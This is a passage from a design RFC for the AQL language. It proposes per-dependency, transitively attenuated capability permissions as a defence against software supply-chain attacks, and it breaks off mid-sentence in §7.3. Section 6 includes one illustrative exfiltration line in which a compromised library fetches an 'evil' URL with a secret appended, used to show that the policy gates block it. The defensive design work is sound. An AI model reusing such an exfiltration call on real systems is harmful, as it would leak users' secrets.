# MODULE-SECURITY.0 — Capability-Confined Transitive Dependencies

**Status: design proposal — RFC, not implemented.** This note extends the
*host-imposed* permission model of [PERMISSIONS.10](PERMISSIONS.10.md)
(implemented) into a *per-dependency, module-declared, transitively-attenuated*
capability model. Where PERMISSIONS.10 answers "how does a host sandbox one
AQL program?", this note answers "how does a program safely depend on code it
did not write, and code *that* code did not write, all the way down?" — AQL's
response to the software-supply-chain trust crisis.

It is written in direct conversation with Laurence Tratt's essay [*Can We
Retain the Benefits of Transitive Dependencies Without Undermining
Security?*](https://tratt.net/laurie/blog/2024/can_we_retain_the_benefits_of_transitive_dependencies_without_undermining_security.html)
(2025-01-28). The short version of the argument below is that AQL, by virtue of
being a *concatenative interpreter with object-capability enforcement and no
ambient authority*, is already most of the way to the system Tratt says our
industry needs — but only for the portion of the dependency graph written *in
AQL*, and only once four already-scaffolded mechanisms are finished and wired
together.

---

## 0. TL;DR

- **Tratt's problem.** In the real world trust decays exponentially with
  distance; in software it is extended *unchanged* to every transitive
  dependency. His site pulls in 20 direct libraries and builds 181. Any one of
  the 161 indirect ones can, within the shared process, "scan my process's
  memory for passwords, and send any it finds over the internet." The process
  is our only real security boundary, and *within* a process there is
  effectively none.

- **Why AQL is different.** AQL code is not machine code in a shared address
  space. An AQL word cannot read arbitrary memory or make a syscall; the *only*
  path to any effect is dispatching a word that reaches a **wrapped capability
  slot** on the registry (`lang/go/native/capabilities.go`). There is no
  ambient authority to strip away — it was never granted. Tratt's core premise
  ("every machine code instruction can read from, and write to, anywhere") is
  *false for the AQL-written part of the graph*.

- **Why the cost objection evaporates.** Tratt notes that his "mutually
  distrusting cells that communicate cheaply" model founders on performance:
  IPC is 5–7 orders of magnitude slower than an in-process call. AQL's
  cell boundary is **a hashtable lookup** (`policyGateWord`,
  `permissionedFileOps`), not a process boundary, and cells communicate by
  passing values on the stack. The expensive part of his design is free here,
  because the interpreter is the single shared trusted runtime and the
  "components" are interpreted data + words, not native code.

- **The four questions this note answers.**
  1. *Do modules declare the capabilities they need?* → **Yes** — a proposed
     `capabilities` block in the module's `aql.jsonic` manifest, read at load
     time, defaulting undeclared capabilities to **deny** (§4).
  2. *Can importers restrict deps even more?* → **Yes** — the effective grant
     to a dependency is `Compose(importer-effective, min(declared, per-dep
     override))`; an importer always hands *less than or equal to* what a
     module asks for (§5).
  3. *Transitivity?* → **Yes, and this is the headline** — `Compose` is
     AND-of-both and composes at every edge, so authority is monotonically
     non-increasing down the chain: `cap(child) ⊆ cap(parent) ⊆ … ⊆ cap(root)`.
     Trust decays along the chain, restoring the exponential decay Tratt says
     software lost (§6).
  4. *Well-known subsets / "a sorting library needs no capabilities"?* → **Yes**
     — a **`pure`** subset (`{}`), plus `deterministic`, `read-only`, `client`,
     … Because all host access funnels through ~9 accessors and AQL has a static
     checker, a module's *declared* footprint can be *statically verified*
     against its *actual* reachable footprint (§7) — the reliable, re-runnable
     whitelisting Tratt calls "incredibly difficult to do."

- **AQL-specific axis.** Resource bounds (step budget, wall-clock, **tape
  growth ceiling**, sub-engine depth, output bytes) are a *second, orthogonal*
  capability axis — quantitative, not allow/deny — that also attenuates
  transitively via the same min-fold. A pure sorting lib gets `{}` *and* a
  bounded tape/step budget: it can neither exfiltrate nor hang nor OOM the host
  (§8).

- **The honest boundary.** All of the above holds for AQL-**source** modules.
  A **native/Go** module (`aql:*`, host plugins) is arbitrary machine code and
  is part of the trusted computing base; policy can gate whether it is
  *imported* but cannot sandbox its Go once loaded (§9). AQL is "sealed at
  compile time" — no runtime `.so` loading — which makes that native tier
  small, fixed, and auditable, concentrating supply-chain risk exactly where
  Tratt says trust should be scarce.

- **State of the substrate.** The enforcement machinery is ~70% built and
  ~30% scaffolded. `Compose`, the capability wrappers, `install:false`
  structural denial, the import gate, and 7 built-in profiles are **live**. The
  per-export gate, the `Limits` enforcement, per-edge attenuation, the manifest,
  and static effect inference are **declared-but-inert or unbuilt** — §3 and §10
  are precise about which is which.

---

## 1. The problem, per Tratt

The essay's spine, faithfully:

1. **Trust is not transitive, but our tools treat it as if it were.** "If a
   good friend introduces me to one of their friends and says that they trust
   them 100%, I will immediately upgrade my level of trust in that person — but
   not to 100%." In software, by contrast, "a flaw — deliberate or otherwise —
   in a dependency of a dependency of a dependency … is implicitly a flaw in my
   software, because I have to extend identical levels of trust to each part of
   the dependency chain equally." 20 direct → 181 built.

2. **The process is the only boundary, and it stops at the process edge.**
   Processes give "reliable, easily reasoned about, and impermeable boundaries."
   But "within a process there is virtually no security … every machine code
   instruction executed has the ability to read from, and write to, anywhere
   within a process's memory." So any of the 181 dependencies "could decide that
   it will scan my process's memory for passwords, and send any it finds over
   the internet to a bad person."

3. **The obvious mitigations don't work.** Banning `unsafe` is impractical (the
   std library is built on it; "I can never find the right balance between too
   little and too much trust"). Manual whitelisting is "incredibly difficult to
   do reliably, and what happens when a new version of a dependency is released
   — do I have to examine it again from scratch?" Control-flow integrity helps
   memory-safety exploits but "wouldn't mitigate the simple password stealing
   attack." Capability hardware (CHERI) is powerful but its compartments demand
   "very careful *temporal* reasoning" that humans get wrong — "a single mistake
   … can accidentally gift a capability with unexpectedly high privileges"; he
   concludes such compartments are best for keeping *cooperative* code from
   going wrong by accident, and that "ensuring that actively malicious code
   doesn't undermine the … guarantees is much harder."

4. **It will get worse.** leftpad, xz, "install every Python library," the
   hypocrite-commits into Linux, an AI-cloned Rust crate becoming a dependency
   of 134 others, Reflections on Trusting Trust. "Our dependency-heavy approach
   to building software is fundamentally incompatible with security" — said
   reluctantly, because the productivity is real and worth keeping.

5. **His aspiration.** Software built from components that are (a) "isolated
   from each other as much as possible" and (b) each holding "the minimum
   permissions it needs" — "I don't want my image decoding component to have
   network access, or the ability to access RAM with passwords in." Components
   are "mutually distrusting dynamic 'cells', like processes, but with the
   ability to communicate more easily, frequently, and cheaply," with tightly
   specified communication. Antecedents: OpenSSH-style privilege separation and
   the actor model. Two hard challenges: **performance** (IPC 5–7 orders too
   slow; shared memory too dangerous for untrusted code) and **expressivity**
   (keep library ergonomics without "the horrors that RPC tends to descend to").
   Solving the first needs rethought hardware/OS; the second, rethought
   *programming languages*.

This note takes up his last sentence — the language rethink — for one language.

---

## 2. Why AQL is structurally different (the thesis)

AQL is a **concatenative, interpreted, object-capability** language. Three
properties, each of which directly negates one of Tratt's objections:

### 2.1 No ambient authority → the memory-scan attack is impossible for AQL code

A dependency in Rust/Python/JS is native (or compiled-to-native) code sharing
one address space; nothing structurally prevents it from reading the bytes
where your password sits. An AQL module is a sequence of **words** interpreted
against a **tape** and a **registry**. AQL has no pointer arithmetic, no `unsafe`,
no FFI reachable from source, and — critically — **no way to name a host
capability except by dispatching a word that the interpreter routes to a
wrapped slot**. The capability substrate is explicit about this
(`lang/go/native/capabilities.go` header): the capability implementations live
on `Registry.Capabilities` under string keys and "aqleng itself never sees
them"; every host touch goes through one of ~9 typed accessors
(`HostFileOps` / `EffectiveFileOps`, `HostFormats`, `HostExtensions`,
`HostSQLite`, `EffectiveClock`, `HostLogSinks`, `EffectiveDebugOps`,
`HostPolicy`). A module that reaches none of these — and imports no
capability-bearing module — *has no way to affect the world*. There is no
ambient authority to confine; it was never granted.

Tratt's premise "every instruction can read/write anywhere" is a statement
about the von Neumann machine under a native language. It is simply not true of
AQL source. That is the whole game.

### 2.2 The cell boundary is a hashtable lookup, not a process

Tratt's model dies on cost: IPC is 5–7 orders of magnitude slower than an
intra-process call, and "Unix-esque shared memory … is far too difficult to use
reliably for untrusted components." AQL pays neither price. The "component
boundary" is:

- **for a kernel word:** `e.policyGateWord(name)` → `CheckWord(name)` — one
  glob-matched map lookup at dispatch (`eng/go/engine.go`, `policy_hook.go`);
- **for an effect:** the permissioned wrapper method
  (`permissionedFileOps.WriteFile` → `policy.Check("fileops","write",{path,bytes})`
  → the inner op) — one policy evaluation per syscall-equivalent;
- **for a whole restricted "cell":** a sub-engine with its own registry and an
  attenuated policy (`aql:vm`), reached by `runInSubEngine` — a Go function
  call, not a `fork`.

Components communicate by leaving **values on the stack** and calling words —
the same mechanism as any other call. There is no serialization, no RPC, no
marshalling tax on the hot path. Tratt's expensive prerequisite is AQL's
default execution model. His expressivity worry ("the horrors that RPC tends to
descend to") likewise dissolves: a dependency's exports are ordinary words with
ordinary signatures.

### 2.3 Declarative, immutable-for-lifetime policy → no temporal-reasoning footgun

Tratt's deepest worry about capability *machines* is temporal: privileges
change as a program moves through states, and "a single mistake … can
accidentally gift a capability with unexpectedly high privileges." AQL's policy
is **data, resolved once, immutable for the lifetime of the engine**
(PERMISSIONS.10 deliberately omits any runtime grant/revoke API — the same
lesson Deno reached when it deprecated `Deno.permissions.request`). Capabilities
are **not first-class values** an AQL program can hold, pass, or forge (unlike a
CHERI capability pointer): the only "capability" a word can touch is the wrapped
slot the host installed, and it cannot be widened from inside. There is no
`doPrivileged`, no stack inspection, no ambient reference to leak. The confused-
deputy surface that sank Java's SecurityManager is absent by construction.

### 2.4 The mapping onto Tratt's aspiration

| Tratt wants | AQL mechanism |
|---|---|
| Components isolated "as much as possible" | Isolated sub-registries per module / per sub-engine; lexical def-namespace isolation (`RunModuleBody`) + capability-slot isolation (this note) |
| "Minimum permissions it needs" | Capability scopes + global hard-caps + `install:false` structural denial |
| Cells that "communicate … cheaply" | Values on the stack; word dispatch; no IPC |
| "Tightly specified" communication | Typed signatures on exports; the checker (`aql check`) |
| Privilege separation (OpenSSH) | `aql:vm` sub-engines with attenuated policy |
| Least privilege enforced, not hoped | Object-capability wrapping; no ambient authority |

**The catch, stated up front (expanded in §9):** every row above holds for
AQL-*source* modules. The interpreter itself, and every *native* (`aql:*`,
Go-implemented) module, is arbitrary machine code to which Tratt's original
argument applies in full. AQL does not abolish the trusted computing base; it
makes it **small, fixed at build time, and legible**, and confines everything
above it.

---

## 3. The substrate that exists today

This section is deliberately precise about built vs. inert, because the design
in §4–§8 leans on it and because [PERMISSIONS.10](PERMISSIONS.10.md) has drifted
from the code in three material ways.

### 3.1 The policy model (`lang/go/policy`, implemented)

- **`Policy` interface** (`policy.go`) — seven methods (the design doc lists
  four): `Check(scope,op,args)`, `CheckGlobal(name)`, `CheckWord(name)`,
  `Installed(scope)`, `Scope(name)`, `Limits()`, `Name()`. The concrete
  implementation is the immutable `*Compiled`. A one-method
  `WordChecker{CheckWord}` is exported so the `eng` kernel can gate words
  without importing the whole policy package.
- **Profile shape** (`profile.go`): `Profile{Version, Name, Extends, Limits,
  Scopes map[string]*Scope}`; `Scope{Install *bool, Words WordsBlock, Scopes}`;
  `WordsBlock{Default Effect, Rules []Rule}`; `Rule{Allow, Deny, Where}`.
  `Effect ∈ {"allow","deny"}`, empty default = allow. Rule order is
  **last-match-wins**.
- **`KnownScopes`** (11): `global, engine, modules, fileops, network, sqlite,
  formats, env, process, clock, log`. (The doc omits `log`.)
- **`GlobalOps`** — 8 coarse hard-caps: `disk.read, disk.write, network,
  process, env, clock, system-info, mutate`. `GlobalsFor(scope,op)` binds
  capability ops to these (e.g. `fileops.write → disk.write`). A capability
  rule can never grant what a global denies (the SCP / `pledge` bounding-set
  pattern).
- **Built-in profiles** (7, not 6): `full, trusted, sandbox, compute, gen,
  read-only, client` (`builtin.go`). `compute` — not "no I/O at all" as the doc
  says, but pure math + clock + `mutate` + in-memory formats + `aql:math`, with
  `fileops/network/sqlite/process/env` all `install:false`. There is **no
  `pure` profile**; `compute` is the pure tier. `gen` (used by property-based
  testing) is absent from the doc entirely.

### 3.2 Enforcement points (what is actually wired)

| Gate | Where | Status |
|---|---|---|
| Kernel word dispatch | `engine.go::policyGateWord` → `CheckWord` = `Check("engine",name,nil)` | **live** (name-only, no args) |
| Module *import* | `modules.go::Resolve` → `Installed("modules")` + `Check("modules","import",{module})` + per-module `install` | **live** (keyed on module ID) |
| File read/write/mkdir | `permissioned_fileops.go` → `Check("fileops",…,{path,bytes})` | **live** |
| Network fetch | `fetch.go::checkFetchPolicy` → `Check("network","connect",{url,host,port})` | **live** |
| Log emit / sink install | `log_module.go::logAllowed` → `Check("log",…)` | **live** |
| `install:false` structural denial | `SetHostFileOps`/`Formats`/`SQLite`/`LogSinks` delete the slot; accessor returns a not-installed stub | **live** |
| Module *export* call | policy evaluator `checkModuleCall` (`Check("modules","call",{module,export})`) | **STUB — fully implemented + tested, but zero production callers.** Per-export deny rules (e.g. `aql:time deny sleep`) are dead. |
| SQLite / env / process / clock per-op | `GlobalsFor` binds them, but no production `Check("sqlite"/"env"/"process"/"clock",…)` | **inert** (only `Installed(sqlite)` on/off is enforced) |
| `mutate` / `system-info` hard-caps | in the enum; no `GlobalsFor` binding; no production `CheckGlobal` callers | **inert** |

### 3.3 Attenuation: `Compose`, not `RequireSubset` (CRITICAL correction)

PERMISSIONS.10 presents `RequireSubset(child, parent)` as *the* attenuation
mechanism. **That function is now marked `DEPRECATED — UNSOUND` in its own
doc-comment** (`subset.go`): it compares only scope defaults and `install`
flags, so a parent `default:allow` + specific `deny` is not enforced on the
child. It has no production callers.

The real, sound primitive is **`Compose(parent, child) Policy`**
(`compose.go`): it returns an AND-of-both wrapper where `Check` / `CheckGlobal`
/ `CheckWord` require **both** layers to allow (parent votes first,
short-circuits), `Installed()` is `parent ∧ child`, and `Limits()` is the
**min-non-zero of each field**. `aql:vm`'s `runInSubEngine` composes
`Compose(parentPol, childPol)` for exactly this reason: a child rule can never
lift a parent deny, *regardless of the child's rule shape*. This is the primitive
the rest of this note builds on.

### 3.4 Isolation and marshalling (two more corrections)

- **Imported AQL modules do NOT start blank.** `RunModuleBody`
  (`native_module_module.go`) runs a file module in a fresh sub-registry but
  **inherits the parent's host capabilities into it**:
  `SetHostFileOps(modReg, HostFileOps(parent))` (already the policy-wrapped
  `permissionedFileOps`), plus formats, extensions, streams, and
  `Modules.InheritConfig` (so the child can itself `import "aql:…"`). Isolation
  today is **lexical** (the def namespace; only `export`ed names cross), **not
  capability**. Worse, `CapPolicy` is *not* propagated, so any capability that
  re-checks at call time via `HostPolicy(childReg)` sees `nil` = allow-all
  inside the child. **Per-dependency capability attenuation for AQL modules is
  therefore genuinely unbuilt** — capabilities flow *down* the import graph
  unattenuated. This is the central gap §5–§6 close.
- **The import boundary is by-reference, not by-copy.** Exports cross as shared
  `*OrderedMap` pointers; an exported `FnDefInfo` carries `Registry: modReg`;
  pointer-backed payloads (`Map`/`Store`/`Array`) share underlying state across
  the boundary. There is no serialization. Consequence for this design: we
  **cannot** rely on a copy boundary to attenuate — we must hand a module
  *already-attenuated* capability wrappers, because anything it receives by
  reference it can invoke or mutate directly.

### 3.5 The capability accessor choke-point → pure modules already exist

Because *all* host access funnels through the ~9 accessors, purity is a
mechanically-checkable property. Grepping both the module builder and the
underlying native implementation, these modules touch **no** accessor and import
no `os`/`net`/`time`/`math-rand`:

> `aql:math-util`, `aql:array-util` (**including `sort`**), `aql:string-util`,
> `aql:type-util`, `aql:struct-util`, `aql:logic-util`, `aql:bin-util`,
> `aql:matrix-util`, and `aql:report`.

These are exactly the `-util` convention modules plus `report`. This is the
concrete evidence behind "a pure sorting library needs no capabilities" (§7):
`aql:array-util`'s `sort` is *already* capability-free and could be *proven* so.

The capability-bearing modules are the complement: `aql:io` (fileops + formats +
sqlite + output), `aql:net` (network), `aql:time-util` (clock + real timers),
`aql:rand` (one clock read at import for the default seed), `aql:query` (sqlite),
`aql:log`, `aql:debug`, `aql:model` (fileops), `aql:parselang` (formats),
`aql:vm`, `aql:test` (clock).

### 3.6 Resource governors (enforced) vs. `Limits` (declared-only)

**Enforced** — hard-coded kernel constants, process-global, no policy input:

| Governor | Value | Where / error |
|---|---|---|
| Interpreter step limit | `DefaultStepLimit = 10_000_000` | `engine.go` Run loop → `evaluation_limit` |
| Paren-group step cap | `maxParenGroupSteps = 10_000_000` | `evalParenGroupAt` → `evaluation_limit` |
| **Tape growth ceiling** | ≈ `1024·2.7⁶` ≈ **397k entries ≈ 64 MB** | `tape.go` gap-buffer; `Exhausted()` → `tape_exhausted` |
| VM operand-stack + frame depth | `vmStackCeiling` (= tape ceiling) | `vm.go` → `tape_exhausted` |
| Parser nesting depth | `maxParseNestingDepth = 10000` | `parser/parse.go` → `evaluation_limit` |
| Check-mode step budget | `DefaultCheckStepBudget = 500_000` | `engine.go` check loop → `step_budget_exceeded` |

The **tape growth ceiling** is the "tape length limitation" the brief names: the
engine runs on a bounded-growth gap buffer (see
[TAPE-DATA-STRUCTURE.10](TAPE-DATA-STRUCTURE.10.md)); a program that splices
without bound latches `exhausted` rather than OOMing the host.

**Declared-only** — `policy.Limits` (`policy.go`) has six fields: `TimeoutMs`,
`MaxStepBudget`, `MaxStackDepth`, `MaxMemoryBytes`, `MaxOutputBytes`, and
`MaxSubEngineDepth` (default 8). They are **resolved, composed (min-fold), and
displayed — but no engine, registry, or module code reads any of them to bound
execution.** Even `MaxSubEngineDepth` is never checked, so `aql:vm` nesting is
unbounded today. The *algebra* for treating limits as attenuating quantitative
capabilities (`Compose(...).Limits()` min-fold) is built and tested; the
*consumer* is missing. §8 closes this.

---

## 4. Do modules declare the capabilities they need?

**Proposal: yes — a `capabilities` block in the module manifest, defaulting
undeclared capabilities to deny.**

### 4.1 Where it attaches

A published AQL module is a `.aql` payload plus an **`aql.jsonic`** manifest
(fields today: `name`, `major`/`minor`/`patch`, `files`, `deps`, per-module
`main` + `resource`), resolved by `aql prep` into **`.aql/aql.json`**, which is
already read *at module-load time* by `resolveModuleMain` and
`loadModuleResources`. That resolved manifest is the natural home for a
capability declaration — it is on the load path already, and the registry's
`handlePublish` is the natural place to record and (eventually) sign it.

### 4.2 Shape

The declaration draws from the existing `KnownScopes` / `GlobalOps` vocabulary
so a module's *ask* and a host's *grant* speak one language:

```jsonic
// aql.jsonic for a CSV-loading module
name: "acme-csv"
major: 1  minor: 2  patch: 0
capabilities: {
  requires: {
    fileops: { read: true }                 // reads files
    formats: { decode: ["csv", "tsv"] }      // decodes these formats
  }
  // everything not listed is implicitly denied
}
```

```jsonic
// aql.jsonic for a sorting library
name: "acme-sort"
capabilities: { requires: {} }               // pure — the empty ask
// equivalently: capabilities: { subset: "pure" }   (see §7)
```

Design decisions:

- **The declaration is a *ceiling the module requests*, not a grant.** The
  effective grant is computed by the importer (§5); a manifest never grants
  itself anything.
- **Undeclared ⇒ deny.** This inverts today's `RunModuleBody` inherit-all. A
  module that forgets to declare `network` cannot reach it — fail-closed,
  matching PERMISSIONS.10's "permissions are opt-in" only in reverse: for
  *dependencies*, capabilities are opt-out-of-nothing, opt-in-by-declaration.
- **Granularity mirrors the policy scope shape** (`scope → op → where`), so a
  module can declare `fileops.read where path in ["./fixtures/**"]` and an
  importer's grant is a further `Compose` on top.
- **Sentinel discipline** (per eng/go/CLAUDE.md "No Zero-Value Overload"):
  resolve "absent = deny" at the single manifest-load boundary so the Go zero
  never reaches a consumer, exactly as `NewRegistry` resolves `-1` sentinels.

### 4.3 Who writes it — and why that is the crux

Tratt's strongest practical objection to whitelisting is authorship:
"incredibly difficult to do reliably, and what happens when a new version …
do I have to examine it again from scratch?" AQL has an answer the native
ecosystems don't: **`aql check` can *infer* the manifest** and offer to write
it. Because the capability scopes are an *effect alphabet* and the carrier
checker already walks the call graph
([effect-oriented-programming-in-aql-report.0](effect-oriented-programming-in-aql-report.0.md)
idea #1), a module's required-capability set is the union of the effect sets of
the words it can reach — a fixpoint the checker already computes for types. So:

1. author writes the module;
2. `aql check --emit-capabilities` infers `{fileops:{read}, formats:{decode:[…]}}`
   and writes it into `aql.jsonic`;
3. the author confirms (or tightens) it;
4. on every new version, step 2 re-runs automatically — the manifest either
   still holds, or the *diff* shows a widened ask (a `network` that wasn't there
   before), which is a reviewable, machine-generated red flag.

This converts Tratt's "examine from scratch on every release" into "review a
one-line capability diff," and it is the same mechanism that makes the
declaration *verifiable* rather than merely *claimed* (§7).

---

## 5. Can importers restrict deps even more?

**Yes — the effective grant to a dependency is the composition of what the
importer holds, what the module asks for, and what the importer chooses to hand
down.** The importer is always the senior party.

### 5.1 The grant algebra

For an import edge *parent → dep*:

```
declared   = dep.aql.jsonic.capabilities.requires        // the ask (§4)
override   = parent's per-dep grant for this edge          // optional, ≤ declared
offered    = min(declared, override)                       // importer may hand LESS
effective  = Compose(parent_effective_policy, offered)     // AND-of-both (§3.3)
```

`Compose` guarantees `effective ⊆ parent_effective`: the dep can never exceed
its importer, and the importer can independently narrow below the ask — a
sorting lib that *declared* `clock` (say, for benchmarking) is handed `{}` by an
importer that doesn't want it timing anything. The importer never has to grant
the full ask; the ask is an upper bound on the *conversation*, not a demand.

### 5.2 Per-import-edge policy (the new mechanism)

Today, policy is registry-global plus a per-module-ID *import* gate. To let an
importer give *different* deps *different* authority, `import` must install each
dependency behind a capability boundary parameterized by that edge's `effective`
policy. Concretely, fixing the §3.4 gap:

- `RunModuleBody` (and the native-module install path) stops inheriting the
  parent's slots wholesale. Instead it installs, into the child sub-registry,
  **attenuated wrappers** built from `effective` — e.g. a `permissionedFileOps`
  whose policy is `effective`, or a deleted slot when `effective` denies the
  scope's `install`.
- `CapPolicy` **is** propagated to the child (currently it is not), so any
  call-time re-check inside the child sees `effective`, not `nil`/allow-all.
- Because marshalling is by-reference (§3.4), the wrappers handed down are
  *already* attenuated — the child cannot reach a rawer capability because it
  never receives one.

A surface sketch (final syntax open, §12):

```aql
import "acme-csv"                                   // grant = declared ∩ parent
import "acme-csv" with { fileops: { read: {
          where: { path: ["./data/**"] } } } }      // grant strictly less
import "acme-sort" as-pure                           // grant = {}  (override to pure)
```

or, declaratively, a per-dependency grant block in the importer's own
`aql.jsonic` alongside `deps`, so the whole tree's edge-grants are one
reviewable artifact (the natural companion to a lockfile, §9.3).

### 5.3 Relationship to `aql:vm`

`aql:vm`'s `Vm.run-with code policy` already runs code under
`Compose(parent, child)` in an isolated sub-engine. Per-edge import attenuation
is, in effect, **`vm.run-with` applied at each `import`** with the edge's
`effective` policy and the module body as the code — the same primitive, moved
from an explicit word to the dependency boundary. This is a strong signal the
mechanism is right: it is not a new enforcement path, it is the existing one
relocated to where dependencies enter.

---

## 6. Transitivity — restoring the exponential decay of trust

This is the headline result and the direct answer to Tratt.

Because `Compose` is AND-of-both and is applied at **every** edge, effective
authority is **monotonically non-increasing along any dependency chain**:

```
cap(great-grandchild) ⊆ cap(grandchild) ⊆ cap(child) ⊆ cap(root)
```

A level-5 indirect dependency can do no more than its level-4 parent chose to
pass down, which is no more than *its* parent passed, all the way to the root
program that the developer actually controls. **Trust decays along the chain
instead of extending unchanged** — precisely the property Tratt says software
lost and physical-world trust retains.

Worked example (Tratt's own image-decoder scenario, in AQL terms):

```
root program            grant: { fileops:{read,write}, network:{connect: allowlist} }
└─ import "acme-report"  grant: Compose(root, report.declared)
   ├─ import "acme-csv"  grant: { fileops:{read} }        // report hands down read-only
   │  └─ import "acme-sort"  grant: {}                     // csv hands down pure
   └─ import "acme-http"  grant: { network:{connect: allowlist ∩ report's} }
```

`acme-sort`, five words from the developer's intent, is **structurally
incapable of touching the network** even if a future release is backdoored: it
was handed `{}`, it runs in a child registry whose network slot is uninstalled,
and there is no ambient authority to fall back on. A compromised `acme-sort`
that inserts `Net.fetch "https://evil/?p=" concat (read-secret)` fails at
`import "aql:net"` (the `modules` import gate denies it) — and even if it were
already imported, at `checkFetchPolicy` (network `install:false`). The
memory-scan attack from §1 has no analogue at all: there is no memory to scan.

### 6.1 What must ship to make this real

Transitivity is *sound in the algebra today* (Compose composes at each `aql:vm`
layer) but *not yet enforced at import edges*. Three concrete items, all
scaffolded:

1. **Per-edge attenuated install** (§5.2): `RunModuleBody` installs `effective`
   wrappers instead of inheriting parent slots; propagate `CapPolicy` to the
   child. *(fixes the §3.4 inherit-all gap)*
2. **Wire the per-export gate**: give `checkModuleCall` (`Check("modules","call",…)`)
   its missing production call site at module-export dispatch, so per-export
   denies (e.g. `deny sleep`) actually bite. *(fixes the §3.2 stub)*
3. **Bound the depth**: enforce `MaxSubEngineDepth` with a counter in
   `runInSubEngine` / the import path, so a maliciously deep transitive chain
   (or `aql:vm` recursion) cannot exhaust the Go stack. *(fixes the §3.6
   inert-limit gap)*

---

## 7. Well-known capability subsets

**Yes — named, reusable capability subsets a module declares and an importer
recognizes at a glance, anchored by a `pure` tier and made trustworthy by
static verification.**

### 7.1 The subset vocabulary

The 7 built-in profiles (§3.1) are the existing named bundles, but they are
*host-global* today. This note reframes them as *per-module subsets* a
dependency can request and an importer can grant wholesale:

| Subset | Capabilities | Example modules |
|---|---|---|
| **`pure`** | `{}` — nothing | `aql:array-util` (`sort`), `aql:math-util`, `aql:string-util`, all `-util`, `aql:report` |
| **`deterministic`** | pure + no clock + no rand seed → reproducible | pure algorithms that must not observe wall-time |
| **`read-only`** | `fileops.read` + `formats.decode` | config loaders, parsers over local files |
| **`compute`** | pure + in-memory formats + `mutate` + clock | number-crunching with scratch state |
| **`client`** | `read-only` + `network.connect` to an allowlist | API SDKs |

A module declares `capabilities: { subset: "pure" }` as sugar for
`requires: {}`; an importer can adopt a *default subset for all transitive
deps* ("everything is `pure` unless I explicitly widen it"), which is the
capability-least-privilege default Tratt asks for, expressed once.

### 7.2 "A sorting library needs basically no capabilities" — and can be *proven* so

This is where AQL answers Tratt's whitelisting objection head-on. It is not
enough for `acme-sort` to *declare* `pure`; a backdoored release could declare
`pure` and still reach `Net.fetch`. What makes the declaration *load-bearing* is
that AQL can **statically verify declared ⊇ actual**:

- **The mechanism.** All host access funnels through ~9 accessors (§3.5), AQL
  has no ambient authority, and the carrier checker already computes a call-graph
  fixpoint. Adding an `Effects []string` facet to signatures (drawn from the
  capability vocabulary) and unioning it up the graph — the
  [effect-oriented-programming report](effect-oriented-programming-in-aql-report.0.md)'s
  highest-leverage idea, currently the one "Absent" row in its parallel-evolution
  table — yields each module's *actual* reachable capability set. The compiler
  already tracks a pure/effectful split informally (`CompileIslandPure`); this
  promotes it to a first-class, inferred, checkable property.
- **The check.** `aql check` verifies the manifest's *declared* set is a
  superset of the *inferred actual* set. A module that declares `pure` but
  reaches a `network` word is a **compile-time capability violation**, reported
  at the call site, *before any runtime denial*. Publish-time gating rejects it.
- **The re-runnability.** On a new version the inference re-runs automatically;
  a widened footprint surfaces as a manifest diff (§4.3). This is exactly the
  "reliable" and "don't re-examine from scratch" that Tratt says manual
  whitelisting lacks.
- **The purity invariant.** Make the `-util` convention a *checked* invariant: a
  lint/test asserting that every `BuildXxxUtilModule` (and every module
  declaring `pure`) touches none of the ~9 accessors. Today the convention is
  documentation in `lang/go/CLAUDE.md`; nothing stops a future `-util` module
  from calling `HostFileOps`. Machine-check it.

Verification is the difference between a manifest that is a *promise* (Tratt's
distrusted case) and a manifest that is a *proof for the AQL-source portion of
the graph*. Native modules can only be *attested*, not verified (§9) — which is
why the trust boundary matters.

### 7.3 Feasibility of capability inference

The verification story in §7.2 rests on a claim — that a module's *actual*
reachable capability footprint is statically computable — that deserves a
sober assessment rather than optimism. It splits into two questions of very
different difficulty:

- **(a) The reachability / purity verdict** — "does this module and its
  transitives reach *any* capability-bearing word, or any dynamic-eval escape
  hatch?" This is **soundly decidable and the load-bearing case** (it backs "a
  sorting library is pure" and lets an importer default-deny all transitives).
- **(b) The precise effect *set*** — "*exactly which* capabilities, with what
  `where`-constraints?" **Feasible, with a soundness/precision trade-off**: some
  modules over-approximate unless annotated.

**Why AQL is unusually favorable.** Doing this in Rust/JS is hard because the
escape hatch is *every pointer and every dynamic call*. In AQL the surface is
small, named, and finite, and the analyzer substrate already exists:

- **Closed effect alphabet + no ambient authority.** Effects enter *only*
  through the ~9 host accessors (§3.5) and the enumerable set of
  capability-bearing words. "Reaches none of them ⇒ pure" is therefore *sound*,
  not hopeful.
- **The carrier checker already computes this shape of analysis.** It walks the
  call graph with memoised per-`def` summaries (`FnSummaries`, keyed by
  scope + name + arg-shape + body; `FnAnalysisQuota = 64` per fn, with an
  `analysis_truncated` diagnostic on blow-up), already walks literal quotation
  bodies (`RunCarrierBodyWithDefs`), and already carries an *effect facet* on
  signatures — `CompileEffect` with flags like `CompileIslandPure` and
  `CompileFallbackBody` (`eng/go/value.go`, `carrier.go`) that classify a word's
  purity for the compiler. A **capability-effect set** is a *new facet on the
  same struct plus a union pass up the same fixpoint*, not a new analyzer.

**The soundness boundary is a short, nameable list of escape hatches** — all of
them specific words the analyzer already knows about:

| Escape hatch | Why hard | Conservative handling |
|---|---|---|
| `do`/`call`/`each`/`fold`/`scan` of a **computed / received** body (not a source literal) | body not statically known | over-approx to the ambient grant, or require an effect annotation |
| `word`-splice (`__SP`) of a computed body | same | same |
| `import` of a **computed** name | breaks transitive enumeration | over-approx / forbid computed import |
| `Vm.run` / `Vm.run-with` of an arbitrary **string** | parses + runs anything | already runs under a *sub-policy*, so bounded to that composed grant |
| Macros | compile-time codegen | analyse **post-expansion** (`macro_expand.go` runs before the checker walks) |
| computed `get` / dot-access of a word by computed key | dynamic dispatch | over-approx / annotation |

Literal quotations, literal word refs, literal imports, and
lambdas-with-literal-bodies (closures the checker already handles via capture
analysis) are all walkable — the common case, and the *only* case pure `-util`
libraries exercise. `do [add 1 1]` is fully analysable *because the body is an
inert-const literal*; the compiler already draws exactly this line, baking a
code-body word "only when its bodies are INERT consts" (`carrier.go`). See §7.4
for the `do` case in full.

**Two properties make the trade-off acceptable:**

1. **Analyzability is itself a capability.** Every escape hatch is a
   capability-gated word, so a grant that withholds `do`-of-nonliteral /
   `call` / `vm` / computed-`import` *makes the analysis both sound and
   precise* by removing the hard cases. You need not soundly analyse `Vm.run`
   in a module that cannot call it. A strict `pure`/`deterministic` profile
   denies the reflective words and collapses the dynamic surface to zero.
2. **The grant is the backstop — the security property never depends on the
   analysis.** Even an *opaque* `do <computed>` can only dispatch words in the
